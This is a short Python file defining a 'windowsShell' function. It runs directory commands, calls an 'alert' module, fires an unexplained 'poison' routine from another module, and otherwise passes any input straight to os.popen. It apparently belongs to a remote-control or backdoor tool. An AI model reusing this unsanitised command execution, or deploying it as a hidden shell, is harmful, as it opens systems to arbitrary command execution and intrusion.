import os, logging
from modules import ost, alert

def windowsShell(inp):
    commands = inp.split(" ")
    arg = commands[-1]
    if len(commands) > 1:
        func = commands[0]
        if func == "cd":
            os.chdir(arg)
        elif func == "mkdir":
            os.mkdir(arg)
        elif func == "rmdir":
            os.rmdir(arg)
        elif func == "alert":
            alert.alert(arg)
        return(None)
    else:
        if arg == "poison":
            ost.main()
        else:
            stream = os.popen(arg)
            return(stream.read())
